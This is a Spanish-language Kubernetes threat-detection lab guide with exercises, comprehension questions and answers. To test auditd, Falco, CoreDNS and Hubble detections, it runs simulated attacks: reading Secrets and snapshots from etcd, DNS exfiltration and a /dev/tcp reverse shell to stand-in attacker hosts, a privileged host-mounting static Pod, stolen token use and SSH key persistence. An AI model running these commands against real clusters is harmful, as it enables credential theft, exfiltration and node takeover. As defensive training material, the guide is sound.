2. Verificá si el cifrado en reposo está configurado, y después leé etcd directamente. Esta es la demostración más convincente de todo el dominio:

   ```bash
   ssh cks-cp
   sudo grep -E 'encryption-provider-config' /etc/kubernetes/manifests/kube-apiserver.yaml || echo "NO ENCRYPTION AT REST"

   sudo ETCDCTL_API=3 etcdctl \
     --endpoints=https://127.0.0.1:2379 \
     --cacert=/etc/kubernetes/pki/etcd/ca.crt \
     --cert=/etc/kubernetes/pki/etcd/server.crt \
     --key=/etc/kubernetes/pki/etcd/server.key \
     get /registry/secrets/prod/payments-db | hexdump -C | head -20
   ```

   ```
   00000000  2f 72 65 67 69 73 74 72  79 2f 73 65 63 72 65 74  |/registry/secret|
   00000010  73 2f 70 72 6f 64 2f 70  61 79 6d 65 6e 74 73 2d  |s/prod/payments-|
   ...
   000000f0  70 61 73 73 77 6f 72 64  12 10 54 72 30 75 62 34  |password..Tr0ub4|
   00000100  64 6f 72 26 33 2d 50 52  4f 44                    |dor&3-PROD|
   ```

3. Confirmá que el cable-trampa de auditd del Ejercicio 2 se disparó con esa lectura de etcd, y con la lectura del certificado de cliente:

   ```bash
   sudo ausearch -k etcd_data -i --start recent | grep -E 'proctitle|key=' | tail -6
   sudo ausearch -k k8s_pki -i --start recent | grep proctitle | tail -3
   ```

4. Detectá el evento de exfiltración de mayor valor de todos — un snapshot de etcd:

   ```bash
   sudo ETCDCTL_API=3 etcdctl \
     --endpoints=https://127.0.0.1:2379 \
     --cacert=/etc/kubernetes/pki/etcd/ca.crt \
     --cert=/etc/kubernetes/pki/etcd/server.crt \
     --key=/etc/kubernetes/pki/etcd/server.key \
     snapshot save /tmp/etcd-exfil.db

   sudo ETCDCTL_API=3 etcdctl --write-out=table snapshot status /tmp/etcd-exfil.db
   sudo ausearch -k k8s_pki -i --start recent | grep -c 'etcdctl'
   ```

5. Agregá una regla de Falco a nivel host para este comportamiento exacto (ocurre fuera de cualquier contenedor, así que `container` **no** debe estar en la condición):

   ```bash
   ssh cks-w1  # or cks-cp, where etcd runs
   sudo tee /etc/falco/rules.d/cks-6.2-data.yaml >/dev/null <<'EOF'
   - macro: cks_etcd_data_dir
     condition: fd.name startswith /var/lib/etcd

   - rule: Etcd Data Directory Accessed By Non-Etcd Process
     desc: Something other than the etcd server touched the raw cluster database. MITRE T1005.
     condition: >
       open_read and cks_etcd_data_dir and not proc.name in (etcd)
     output: >
       Raw etcd data accessed (proc=%proc.name cmd=%proc.cmdline file=%fd.name
       user=%user.name uid=%user.uid parent=%proc.pname container=%container.name)
     priority: CRITICAL
     tags: [host, data, mitre_collection, T1005]

   - rule: Etcd Snapshot Taken
     desc: etcdctl snapshot save invoked - full cluster state, every Secret, in one file.
     condition: >
       spawned_process and proc.name in (etcdctl, etcdutl) and proc.cmdline contains "snapshot"
     output: >
       etcd snapshot invoked (cmd=%proc.cmdline user=%user.name uid=%user.uid
       parent=%proc.pname cwd=%proc.cwd)
     priority: CRITICAL
     tags: [host, data, mitre_collection, T1005]
   EOF
   sudo falco --validate /etc/falco/rules.d/cks-6.2-data.yaml && sudo systemctl restart falco-modern-bpf
   ```

6. Encontrá cada Pod que todavía monta un token proyectado que no necesita — cada uno es exposición innecesaria de credenciales y por lo tanto carga de detección innecesaria:

   ```bash
   kubectl get pods -A -o json | jq -r '
     .items[]
     | select(.spec.automountServiceAccountToken != false)
     | select([.spec.volumes[]? | select(.projected.sources[]?.serviceAccountToken)] | length > 0)
     | "\(.metadata.namespace)/\(.metadata.name)\tsa=\(.spec.serviceAccountName)"' | head -20
   ```

7. Correlacioná las dos mitades de un robo de credenciales. Primero el token fue leído en el nodo (Falco, Ejercicio 3), después fue *usado* contra la API (log de auditoría). Uní ambos por tiempo e identidad:

   ```bash
   sudo jq -c 'select(.user.username=="system:serviceaccount:prod:app-sa")
     | {t:.requestReceivedTimestamp, ip:.sourceIPs[0], verb:.verb,
        res:.objectRef.resource, code:.responseStatus.code, ua:.userAgent}' \
     /var/log/kubernetes/audit/audit.log | tail -10
   ```

### Preguntas de comprensión

- **P5.1** — El paso 2 imprimió la contraseña en texto plano. El cifrado en reposo con un proveedor `secretbox` o KMS la ocultaría. ¿Eso detiene al atacante del paso 2? Explicá con precisión a qué atacante detiene y a cuál no.
- **P5.2** — En el log de auditoría, una lectura de Secret se registra en `Metadata`. Si un atacante lee el mismo Secret a través de un *volumen proyectado* en un Pod en lugar de a través de la API, ¿el log de auditoría muestra algo? ¿Qué sensor cubre ese camino?
- **P5.3** — Tu correlación del paso 7 muestra `sourceIPs[0]` igual a una IP de Pod. ¿Por qué es ese campo el pivote más útil para un token de ServiceAccount robado, y qué topología de despliegue destruye su valor?
- **P5.4** — La regla `Etcd Snapshot Taken` se dispara con `proc.cmdline contains "snapshot"`. Dá dos maneras en que un atacante con root en el nodo obtiene los mismos datos sin ejecutar nunca `etcdctl`, y decí qué regla de este ejercicio sigue atrapando cada una.

---

## Ejercicio 6 — Redes: flujos descartados, tunelización DNS y reverse shells

### Pasos

1. Establecé una línea base de denegación por defecto en `prod`. Sin ella, no existe tal cosa como un "flujo descartado" sobre el que alertar:

   ```bash
   kubectl apply -f - <<'EOF'
   apiVersion: networking.k8s.io/v1
   kind: NetworkPolicy
   metadata:
     name: default-deny-all
     namespace: prod
   spec:
     podSelector: {}
     policyTypes:
       - Ingress
       - Egress
   EOF

   kubectl apply -f - <<'EOF'
   apiVersion: networking.k8s.io/v1
   kind: NetworkPolicy
   metadata:
     name: allow-dns
     namespace: prod
   spec:
     podSelector: {}
     policyTypes: ["Egress"]
     egress:
       - to:
           - namespaceSelector:
               matchLabels:
                 kubernetes.io/metadata.name: kube-system
             podSelector:
               matchLabels:
                 k8s-app: kube-dns
         ports:
           - protocol: UDP
             port: 53
           - protocol: TCP
             port: 53
   EOF
   ```

2. Activá el logging de consultas DNS en CoreDNS — la detección de red de mayor rendimiento y más portable entre CNIs que podés desplegar en un clúster Kubernetes:

   ```bash
   kubectl -n kube-system get cm coredns -o yaml > /tmp/coredns.bak.yaml
   kubectl -n kube-system get cm coredns -o jsonpath='{.data.Corefile}'
   ```

   Insertá `log` inmediatamente después de `errors`:

   ```bash
   kubectl -n kube-system edit cm coredns
   # .:53 {
   #     errors
   #     log
   #     health { lameduck 5s }
   #     ...
   kubectl -n kube-system rollout restart deploy coredns
   kubectl -n kube-system rollout status deploy coredns
   ```

3. Generá tres amenazas de red distintas desde la carga de trabajo:

   ```bash
   # (a) DNS exfiltration / tunnelling: high-cardinality encoded subdomains
   kubectl -n prod exec payments -- sh -c '
     for i in $(seq 1 40); do
       host "$(head -c 24 /dev/urandom | base32 | tr -d = | tr "[:upper:]" "[:lower:]").exfil.attacker.example" >/dev/null 2>&1
     done; echo sent'

   # (b) Blocked egress: default-deny should drop this
   kubectl -n prod exec payments -- sh -c 'timeout 3 nc -zv 198.51.100.77 4444 2>&1 | tail -2'

   # (c) Internal port scan
   kubectl -n prod exec payments -- sh -c 'timeout 20 nmap -sT -Pn -p 22,443,2379,6443,10250 <CP_NODE_IP> 2>&1 | tail -12'
   ```

4. Detectá el túnel DNS por cardinalidad de subdominios — la firma clásica es *muchas etiquetas únicas bajo un mismo dominio padre*:

   ```bash
   kubectl logs -n kube-system -l k8s-app=kube-dns --since=15m --tail=-1 \
     | awk '{print $7}' | tr -d '"' | sed 's/\.$//' \
     | awk -F. 'NF>=2 { print $(NF-1)"."$NF"\t"$0 }' \
     | sort -u | cut -f1 | uniq -c | sort -rn | head
   ```

   ```
        40 attacker.example
        14 cluster.local
         3 ubuntu.com
   ```

   Después mirá la distribución de largo de etiquetas — los dominios humanos son cortos, los codificados no:

   ```bash
   kubectl logs -n kube-system -l k8s-app=kube-dns --since=15m --tail=-1 \
     | awk '{print $7}' | tr -d '"' | awk -F. '{print length($1), $0}' | sort -rn | head -5
   ```

5. Detectá los flujos bloqueados. **Camino Cilium:**

   ```bash
   cilium hubble port-forward &
   hubble observe --namespace prod --verdict DROPPED --last 100
   hubble observe --namespace prod --protocol dns --last 50 -o json | jq -c '.l7.dns.query' | head
   hubble observe --namespace prod --from-pod prod/payments --last 200 \
     | awk '{print $NF}' | sort | uniq -c
   ```

   ```
   Aug  5 14:52:11.114: prod/payments:38112 (ID:24581) <> 198.51.100.77:4444 (world) Policy denied DROPPED (TCP Flags: SYN)
   Aug  5 14:52:14.219: prod/payments:38114 (ID:24581) <> 10.0.0.11:6443 (host)  Policy denied DROPPED (TCP Flags: SYN)
   ```

   **Alternativa agnóstica al CNI** — observá el tráfico del Pod desde el nodo:

   ```bash
   ssh cks-w1
   PID=$(sudo crictl inspect $(sudo crictl ps --name payments -q) | jq -r '.info.pid')
   sudo nsenter -t "$PID" -n ss -tunap state all | head -20
   sudo nsenter -t "$PID" -n timeout 20 tcpdump -nn -i any 'udp port 53 or tcp[tcpflags] & tcp-syn != 0'
   sudo conntrack -L 2>/dev/null | grep -c SYN_SENT
   ```

6. Confirmá que la regla de reverse shell del Ejercicio 3 se dispara con la firma real:

   ```bash
   # Terminal A on cks-w1
   sudo journalctl -u falco-modern-bpf -f
   # Terminal B
   kubectl -n prod exec payments -- sh -c 'timeout 5 sh -i >/dev/tcp/198.51.100.77/4444 0>&1' 2>/dev/null; echo tried
   ```

7. Restaurá CoreDNS:

   ```bash
   kubectl -n kube-system apply -f /tmp/coredns.bak.yaml
   kubectl -n kube-system rollout restart deploy coredns
   ```

### Preguntas de comprensión

- **P6.1** — ¿Por qué el DNS es la detección de red de mayor rendimiento en un clúster Kubernetes, incluso cuando hay una política de denegación por defecto de egress vigente? Atá tu respuesta a la política `allow-dns` que escribiste.
- **P6.2** — `hubble observe --verdict DROPPED` produjo entradas. Un colega argumenta que el descarte prueba que la prevención funcionó, así que no hace falta alertar. Rebatilo en términos de lo que un descarte te dice sobre el *estado de la carga de trabajo*.
- **P6.3** — La `NetworkPolicy` central de Kubernetes no tiene ninguna acción de logging. Nombrá los dos mecanismos por los cuales igual obtenés veredictos por flujo, e indicá qué dependencia introduce cada uno.
- **P6.4** — El reverse shell del paso 6 usó el pseudo-dispositivo `/dev/tcp` de bash, que no emite ningún `execve` para `nc`. Explicá por qué la regla `STDIO Redirected To Network Socket` igual se dispara mientras que una regla que hiciera match con `proc.name = nc` no lo haría.

---

## Ejercicio 7 — Cargas de trabajo: contenedores clandestinos, drift e inyección de Pods estáticos

El API server solo conoce las cargas de trabajo que el API server creó. Este ejercicio encuentra el resto.

### Pasos

1. Compará la vista del runtime con la vista de la API. Cualquier contenedor al que le falten las etiquetas de Pod del kubelet **no** fue creado por Kubernetes:

   ```bash
   ssh cks-w1
   sudo crictl ps -o json | jq -r '
     .containers[]
     | [ .metadata.name,
         (.labels["io.kubernetes.pod.namespace"] // "NO-K8S-LABEL"),
         (.labels["io.kubernetes.pod.name"] // "NO-K8S-LABEL"),
         .image.image ] | @tsv' | column -t
   ```

2. Mirá un nivel más profundo. `crictl` solo muestra el namespace del CRI; `ctr` ve todos los namespaces de containerd, incluidos los que el kubelet nunca consulta:

   ```bash
   sudo ctr namespaces list
   for ns in $(sudo ctr namespaces list -q); do
     echo "== namespace: $ns"
     sudo ctr -n "$ns" containers list
   done
   ```

   ```
   NAME    LABELS
   k8s.io
   default

   == namespace: k8s.io
   CONTAINER   IMAGE                                   RUNTIME
   3f2a...     registry.k8s.io/pause:3.10              io.containerd.runc.v2
   == namespace: default
   CONTAINER   IMAGE                                   RUNTIME
   miner01     docker.io/library/alpine:3.20           io.containerd.runc.v2
   ```

3. Verificá cruzando con cgroups. Todo contenedor gestionado por el kubelet vive bajo `kubepods.slice`; cualquier otra cosa que corra como contenedor, no:

   ```bash
   sudo find /sys/fs/cgroup/kubepods.slice -maxdepth 3 -name 'cri-containerd-*.scope' | wc -l
   sudo crictl ps -q | wc -l
   sudo systemd-cgls --no-pager | grep -v kubepods | grep -iE 'containerd-|runc' | head
   ```

4. Cazá comportamiento de secuestro de recursos a nivel de nodo:

   ```bash
   sudo crictl stats --output table
   ps -eo pid,ppid,pcpu,etimes,comm,args --sort=-pcpu | head -8
   sudo ss -tnp state established '( dport = :3333 or dport = :4444 or dport = :14444 )'
   ```

5. Detectá la inyección de Pod estático — el paso clásico de persistencia de nodo a clúster:

   ```bash
   # Simulate the attacker
   sudo tee /etc/kubernetes/manifests/kube-sysmon.yaml >/dev/null <<'EOF'
   apiVersion: v1
   kind: Pod
   metadata:
     name: kube-sysmon
     namespace: kube-system
   spec:
     hostNetwork: true
     hostPID: true
     containers:
       - name: sysmon
         image: docker.io/library/alpine:3.20
         command: ["sleep", "3600"]
         securityContext:
           privileged: true
         volumeMounts:
           - name: host
             mountPath: /host
     volumes:
       - name: host
         hostPath:
           path: /
   EOF
   ```

   Ahora detectalo desde tres ángulos independientes:

   ```bash
   # (a) auditd fired the moment the file was written (Exercise 2)
   sudo ausearch -k k8s_static_pod -i --start recent | grep -E 'proctitle|nametype=CREATE' | tail -4

   # (b) AIDE sees an added entry
   sudo aide --config=/etc/aide/cks.conf --check | sed -n '/Added entries/,/^$/p'

   # (c) The mirror Pod appears in the API with no controller owner
   kubectl -n kube-system get pods -o json | jq -r '
     .items[]
     | select(.metadata.ownerReferences == null
              or (.metadata.ownerReferences[0].kind == "Node"))
     | "\(.metadata.name)\tnode=\(.spec.nodeName)\towner=\(.metadata.ownerReferences[0].kind // "NONE")"'
   ```

6. Barré todo el clúster buscando la postura privilegiada que una carga de trabajo clandestina necesita:

   ```bash
   kubectl get pods -A -o json | jq -r '
     .items[]
     | . as $p
     | ($p.spec.containers[] | select(
          .securityContext.privileged == true
          or (.securityContext.capabilities.add // [] | index("SYS_ADMIN"))
          or (.securityContext.capabilities.add // [] | index("SYS_PTRACE"))
       )) as $c
     | "\($p.metadata.namespace)/\($p.metadata.name)\tctr=\($c.name)\tnode=\($p.spec.nodeName)"'

   kubectl get pods -A -o json | jq -r '
     .items[] | select([.spec.volumes[]? | select(.hostPath.path == "/" or .hostPath.path == "/var/run" or .hostPath.path=="/etc")] | length > 0)
     | "\(.metadata.namespace)/\(.metadata.name)\thostPath=\([.spec.volumes[]?.hostPath.path // empty] | join(","))"'
   ```

7. Limpiá:

   ```bash
   sudo rm -f /etc/kubernetes/manifests/kube-sysmon.yaml
   kubectl -n kube-system get pod kube-sysmon 2>&1 | tail -1
   ```

### Preguntas de comprensión

- **P7.1** — En el paso 2, `miner01` apareció en el namespace `default` de containerd. ¿Por qué no aparece en `crictl ps`, y por qué ningún controlador de admisión, ninguna etiqueta PSA y ninguna NetworkPolicy se le van a aplicar jamás?
- **P7.2** — En el paso 5c filtraste por `ownerReferences[0].kind == "Node"`. Explicá qué es un mirror Pod y por qué un atacante que inyecta un Pod estático es igualmente *visible* en la API — y qué haría para derrotar exactamente esa verificación.
- **P7.3** — El manifiesto `kube-sysmon` pone `hostPID: true` y monta `/`. Nombrá la capacidad de detección específica que `hostPID: true` le otorga al atacante *contra tus propios sensores*.
- **P7.4** — Borrar `/etc/kubernetes/manifests/kube-sysmon.yaml` eliminó el Pod. ¿Constituye eso la remediación de este incidente? Enumerá lo que tenés que verificar antes de poder decir que el nodo está limpio.

---

## Ejercicio 8 — Capstone: correlacionar la cadena completa del ataque

Ahora tenés cinco sensores independientes. Este ejercicio ejecuta una intrusión coherente y te obliga a reconstruirla solo a partir de la evidencia.

### Pasos

1. Opcionalmente conectá el log de auditoría a Falco para que tanto los eventos de syscalls como los de la API caigan en un mismo flujo. En `cks-cp`:

   ```bash
   sudo falcoctl artifact install k8saudit
   sudo falcoctl artifact install k8saudit-rules

   sudo tee /etc/kubernetes/audit/webhook.yaml >/dev/null <<'EOF'
   apiVersion: v1
   kind: Config
   clusters:
     - name: falco
       cluster:
         server: http://127.0.0.1:9765/k8s-audit
   contexts:
     - context:
         cluster: falco
         user: ""
       name: default-context
   current-context: default-context
   preferences: {}
   users: []
   EOF
   ```

   Agregá al manifiesto del API server:

   ```yaml
       - --audit-webhook-config-file=/etc/kubernetes/audit/webhook.yaml
       - --audit-webhook-batch-max-wait=5s
   ```

   Y habilitá el plugin en `/etc/falco/falco.yaml`:

   ```yaml
   plugins:
     - name: k8saudit
       library_path: libk8saudit.so
       init_config: ""
       open_params: "http://:9765/k8s-audit"
     - name: json
       library_path: libjson.so

   load_plugins: [k8saudit, json]
   ```

2. Ejecutá la intrusión. Corré los pasos en orden y anotá la hora de reloj de cada uno:

   ```bash
   date -u +%T   # T0
   # (1) Initial access - operator credentials abused for a shell
   kubectl -n prod exec -it payments -- sh -c '
     id; ls /var/run/secrets/kubernetes.io/serviceaccount/'

   # (2) Discovery
   kubectl -n prod exec payments -- sh -c 'env | grep KUBERNETES; cat /etc/resolv.conf'

   # (3) Credential access
   kubectl -n prod exec payments -- sh -c \
     'cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/t; wc -c /tmp/t'

   # (4) Privilege escalation - the stolen SA now has cluster-admin (from Ex. 4)
   TOKEN=$(kubectl -n prod exec payments -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   curl -sk -H "Authorization: Bearer $TOKEN" -A "curl/8.5.0" \
     https://127.0.0.1:6443/api/v1/namespaces/kube-system/secrets | jq -r '.items[].metadata.name' | head

   # (5) Lateral movement / escape - privileged Pod pinned to a node
   kubectl apply -f - <<'EOF'
   apiVersion: v1
   kind: Pod
   metadata: {name: node-shell, namespace: prod}
   spec:
     hostPID: true
     nodeName: cks-w1
     containers:
       - name: shell
         image: docker.io/library/alpine:3.20
         command: ["sleep","1800"]
         securityContext: {privileged: true}
         volumeMounts: [{name: host, mountPath: /host}]
     volumes: [{name: host, hostPath: {path: /}}]
   EOF
   kubectl -n prod wait --for=condition=Ready pod/node-shell --timeout=90s

   # (6) Persistence on the node
   kubectl -n prod exec node-shell -- sh -c \
     'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICapstoneProbe atk@lab" >> /host/root/.ssh/authorized_keys'

   # (7) Impact / exfiltration
   kubectl -n prod exec node-shell -- sh -c \
     'timeout 3 nc -w1 198.51.100.77 14444 </dev/null; echo attempted'
   date -u +%T   # T1
   ```

3. Reconstruí la línea de tiempo **solo a partir de la evidencia**. Para cada paso numerado del ataque, producí la consulta que lo prueba y la línea exacta de evidencia:

   ```bash
   # API-layer evidence
   sudo jq -c 'select(.requestReceivedTimestamp > "2026-08-05T15:00:00Z")
     | select((.objectRef.subresource // "") == "exec"
              or (.objectRef.resource == "pods" and .verb == "create")
              or (.objectRef.resource == "secrets"))
     | {t:.requestReceivedTimestamp, u:.user.username, ip:.sourceIPs[0],
        verb:.verb, res:(.objectRef.resource + "/" + (.objectRef.subresource // "")),
        name:.objectRef.name, ua:.userAgent, code:.responseStatus.code}' \
     /var/log/kubernetes/audit/audit.log

   # Syscall-layer evidence
   sudo journalctl -u falco-modern-bpf --since "15:00" -o cat | grep -E 'Critical|Error'

   # Host-layer evidence
   sudo ausearch -k ssh_keys -i --start recent | grep proctitle | tail -3
   sudo aide --config=/etc/aide/cks.conf --check | head -20

   # Network-layer evidence
   hubble observe --namespace prod --verdict DROPPED --since 15m 2>/dev/null | tail
   ```

4. Completá el scorecard de detección. Marcá cada fila como `DETECTED` / `MISSED`, nombrá el sensor y registrá la marca de tiempo de evidencia *más temprana*:

   | # | Paso del ataque | ID MITRE | Capa | Sensor que se disparó | Primera evidencia a las | Veredicto |
   |---|---|---|---|---|---|---|
   | 1 | `exec` dentro de un Pod en ejecución | T1609 | usuarios / cargas de trabajo | | | |
   | 2 | Descubrimiento dentro del contenedor | T1613 | cargas de trabajo | | | |
   | 3 | Lectura del token de SA desde disco | T1552.001 | datos | | | |
   | 4 | Token usado contra la API | T1078.004 | usuarios | | | |
   | 5 | Pod privilegiado en el nodo elegido | T1610 / T1611 | cargas de trabajo | | | |
   | 6 | Clave SSH escrita en el root del nodo | T1098.004 | infraestructura física | | | |
   | 7 | Egress hacia el atacante en 14444 | T1496 / T1048 | redes | | | |

5. Calculá tu tiempo medio de detección e identificá el **eslabón más débil** — el paso con la mayor brecha entre la acción y la evidencia:

   ```bash
   # Earliest evidence timestamp across all sources for a chosen step, e.g. step 3
   sudo journalctl -u falco-modern-bpf --since "15:00" -o short-iso \
     | grep 'SA token read' | head -1
   ```

6. Limpiá todo el laboratorio:

   ```bash
   kubectl delete ns prod sre-debug --ignore-not-found
   kubectl delete clusterrolebinding rogue-admin --ignore-not-found
   sudo sed -i '/CapstoneProbe/d' /root/.ssh/authorized_keys
   sudo rm -f /tmp/etcd-exfil.db
   ssh cks-w1 'sudo ctr -n default containers rm miner01 2>/dev/null; true'
   ```

### Preguntas de comprensión

- **P8.1** — El paso 4 usó el token robado desde *fuera* del Pod, pero `sourceIPs[0]` en el log de auditoría muestra la IP del nodo del control plane, no la IP del Pod. ¿Cuál es la lección general sobre `sourceIPs` como campo de atribución, y qué campo de auditoría sigue siendo confiable?
- **P8.2** — El paso 5 del ataque creó un Pod privilegiado a través de la API y quedó registrado. El paso 6 escribió en el sistema de archivos del nodo a través de ese Pod y **no** produjo ningún evento de API. Enunciá la regla general que esto ilustra sobre en qué punto de la cadena el log de auditoría de la API deja de ser útil.
- **P8.3** — Tu scorecard probablemente marca el paso 2 (descubrimiento dentro del contenedor: `env`, `cat /etc/resolv.conf`) como `MISSED`. ¿Es esa una falla de detección que deberías arreglar? Argumentá ambos lados y dá tu decisión de ingeniería.
- **P8.4** — La cadena completa es visible solo porque cinco sensores en tres hosts distintos fueron correlacionados a mano. Nombrá los dos cambios arquitectónicos que hacen que esa correlación sobreviva a un incidente real, y explicá por qué *ninguno* de los dos es "instalar más reglas".

---

<details>
<summary><strong>Respuestas</strong> — expandí solo después de intentar cada bloque</summary>

### Ejercicio 1 — Superficie de detección

**R1.1 —** No. `auditd` `active` significa que el demonio y el subsistema de auditoría del kernel están corriendo y van a registrar el pequeño conjunto de reglas por defecto (eventos de login, algunas denegaciones AVC), pero `No rules` significa **ninguna vigilancia y ningún filtro de syscalls** para nada relevante a Kubernetes. El demonio es un transporte sin nada que transportar. `systemctl is-active` es una verificación de vitalidad, nunca una verificación de cobertura; la verificación de cobertura es `auditctl -l` y, para efectividad, disparar deliberadamente una regla y encontrarla con `ausearch -k`.

**R1.2 —** La capa de **usuarios** y la capa de **datos**. Sin `--audit-log-path` (o un `--audit-webhook-config-file`) el API server descarta cada evento de auditoría, así que no hay registro de quién se autenticó, qué identidad leyó qué Secret, quién creó un Pod privilegiado, quién asignó `cluster-admin`, o quién hizo exec en un Pod. Los sensores a nivel de nodo no pueden sustituirlo: ven una conexión TLS al puerto 6443 y nada sobre su contenido. El log de auditoría del API server es la *única* fuente de actividad atribuida a una identidad en Kubernetes.

**R1.3 —** Un atacante que obtiene root en un nodo puede leer, manipular o borrar la evidencia misma de su intrusión — el log de auditoría, la salida de Falco, el log de `auditd` y la base de datos de AIDE están todos en el host comprometido. La solución arquitectónica es enviar la evidencia fuera del nodo casi en tiempo real y hacer que el destino sea de solo-anexado: `--audit-webhook-config-file` para el API server, `program_output`/`http_output` o falcosidekick para Falco, `audisp-remote` para `auditd`, y una base de datos de AIDE almacenada en medios de solo lectura o remotos. La detección que vive dentro del radio de impacto del atacante no es detección.

**R1.4 —** El kubelet expone una API privilegiada — `/pods`, `/exec`, `/run`, `/runningpods` — y **no lleva ningún log de auditoría propio**. Un atacante que llega al puerto 10250 anónimamente puede ejecutar comandos en cualquier contenedor de ese nodo, y la *única* evidencia es lo que un sensor de syscalls llegue a captar en ese nodo. Nada de eso aparece en el log de auditoría del API server, porque el API server nunca estuvo involucrado. La API del kubelet es por lo tanto un hueco de detección en la capa de identidad, no meramente un puerto abierto: le permite al atacante actuar sobre cargas de trabajo mientras evade la única fuente de verdad atribuida del clúster.

---

### Ejercicio 2 — Capa de host

**R2.1 —** `-p wa` registra escrituras (**w**rites) y cambios de atributos (**a**ttribute). `-p rwa` agrega lectura (**r**ead). Para `/etc/kubernetes/manifests/` la amenaza es *colocar* código en el nodo, que es una escritura. Para `/etc/kubernetes/pki/` la amenaza es *robar* la CA del clúster y la clave de cliente del API server, que es una lectura — un atacante que copia `ca.key` puede acuñar un certificado de cliente `system:masters` que RBAC no puede revocar y que requiere una rotación completa de la PKI para invalidar. Con `-p wa` en el directorio de la PKI no verías absolutamente nada durante ese robo. El costo es volumen: las vigilancias de lectura en rutas calientes son caras, y por eso se las acota a material genuinamente secreto en vez de a `/etc` entero.

**R2.2 —** Entregá el **`auid`** (el UID de auditoría/login). `uid=root` solo dice que el proceso corría como root en ese momento, lo cual es cierto para casi todo en un nodo Kubernetes y se alcanza trivialmente mediante `sudo`, binarios setuid, o un contenedor privilegiado. `auid` es la identidad que originalmente inició sesión; el kernel la estampa al login y es **inmutable** para todo el árbol de procesos, así que `sudo` y `su` no la cambian. `auid=ubuntu` le dice a quien responde qué cuenta humana suspender y qué sesión SSH correlacionar. Salvedad: `auid` es `unset` (4294967295) para procesos sin ascendencia de login — contenedores lanzados por el kubelet, servicios de systemd — que es exactamente por qué los filtros `-F auid>=1000 -F auid!=unset` aparecen en las reglas de comportamiento interactivo y están deliberadamente ausentes de `kernel_modules`.

**R2.3 —** `-e 2` establece la configuración de auditoría como **inmutable**: no se puede agregar, cambiar ni borrar ninguna regla hasta el próximo reinicio, y los intentos se registran. Derrota el movimiento antiforense estándar de `auditctl -D`. El costo es que cualquier cambio legítimo de reglas requiere reiniciar el nodo, y debe ser la **última línea** del último archivo de reglas cargado, porque todo lo que venga después es rechazado. En un nodo Kubernetes ese reinicio es barato (cordon, drain, reboot), así que `-e 2` es la configuración correcta en producción — habilitalo una vez que tus reglas se hayan estabilizado.

**R2.4 —** No es una fuga. AIDE guarda ruta, metadatos y hashes criptográficos, nunca contenidos de archivos, así que las claves privadas en sí no están en la base de datos; incluirlas es correcto porque *querés* saber si la clave de la CA del clúster fue reemplazada. El riesgo real es la **base de datos misma**: un atacante con root en el nodo modifica un archivo y después corre `aide --init` para rehacer la línea base, y toda verificación posterior reporta limpio. Mitigaciones: guardar la DB fuera del nodo o en medios de solo lectura, firmar o hashear la DB y verificar el hash desde otro sistema, correr la verificación desde un planificador externo confiable en vez de un cron local que el atacante puede editar, y vigilar `/var/lib/aide/` con una regla de `auditd` para que rehacer la línea base sea en sí mismo una alerta.

**R2.5 —** Con `-b 8192`, el backlog del kernel se llena. `--backlog_wait_time 60000` hace que el kernel **estrangule los procesos ofensores** (haciéndolos esperar hasta 600 ms por evento, en unidades de 1/100 s) en vez de descartar registros — así que el primer efecto visible es una lentitud severa en todo el sistema, no pérdida de evidencia. Si el backlog igual se desborda, `lost` se incrementa y se descartan registros. `-f 1` significa "ante una falla, hacer `printk` de un mensaje y seguir andando"; si hubiera sido `-f 2`, el kernel **haría panic en el nodo**. Entonces: `lost` sube, la evidencia de esa ventana queda incompleta, y el nodo se degrada o se detiene. Este es un ataque real — inundar el subsistema de auditoría es a la vez una denegación de servicio y una técnica de destrucción de evidencia — y por eso dimensionás `-b` con generosidad, acotás las vigilancias estrechamente, y alertás sobre `lost > 0` como una señal de primer orden.

---

### Ejercicio 3 — Falco

**R3.1 —** `proc.tty != 0` requiere una terminal de control, lo que significa que la regla se dispara con `kubectl exec -it` pero **no** con una shell lanzada sin TTY: `kubectl exec` sin `-t`, una webshell dejada por un RCE en la aplicación, un reverse shell, o una shell lanzada por un entrypoint comprometido. Upstream la mantiene porque el debugging interactivo es común y ruidoso, y la condición de TTY elimina la mayor fuente de falsos positivos al costo de los casos más silenciosos y peligrosos. La respuesta de producción es correr las dos: mantener la regla acotada por TTY de upstream en `NOTICE` por higiene, y agregar una variante separada sin TTY en `CRITICAL` acotada a namespaces donde una shell nunca debería aparecer.

**R3.2 —** Sin `override`, Falco 0.38+ trata un segundo documento con el mismo nombre en `rule:` como un **reemplazo completo** de la definición anterior — los archivos posteriores en el orden de carga ganan, y tu intención ("también excluir este namespace") se convierte silenciosamente en "esto es ahora toda la regla", perdiendo cada condición de upstream. `append: true` está deprecado; en 0.41 todavía funciona pero emite una advertencia de deprecación, y la forma mantenida es `override: {condition: append}` (también `output: append`, `exceptions: append`, o `replace` para cualquier campo). Corré siempre `falco --validate` y, después de cargar, confirmá la condición efectiva con `falco -L` en vez de asumir.

**R3.3 —** Falco nombra los dos extremos de una conexión por rol, no por dirección: `fd.cip`/`fd.cport` son el **cliente** (el lado que inició), `fd.sip`/`fd.sport` son el **servidor** (el lado que aceptó). Para una conexión saliente desde un contenedor, el contenedor es el cliente y el pool de minería remoto es el servidor — así que el puerto remoto es `fd.sport`. Cambiar a `fd.cport` haría match con el puerto de origen efímero del propio contenedor, que el kernel asigna del rango efímero esencialmente al azar; la regla casi nunca se dispararía, y cuando lo hiciera sería sobre una conexión benigna a la que le tocó el puerto 4444 como origen. Este es uno de los bugs de reglas de Falco más comunes en el mundo real.

**R3.4 —** Los namespaces son baratos y a menudo autoservicio. Si una excepción está clavada solo en `k8s.ns.name = "sre-debug"`, cualquier atacante que pueda crear un namespace con ese nombre, o que comprometa cualquier carga de trabajo que ya esté ahí, obtiene un punto ciego permanente — publicaste la ubicación de tu propio punto ciego en el archivo de reglas. Emparejar el namespace con `container.image.repository` lo acota a una imagen conocida, y emparejarlo además con un **digest** de imagen en vez de un tag lo acota a contenido conocido. El principio general: las excepciones deben estar clavadas en atributos que el atacante no pueda elegir. Cada excepción es una superficie de ataque; escribí las menos y más estrechas que puedas, y revisalas como revisás RBAC.

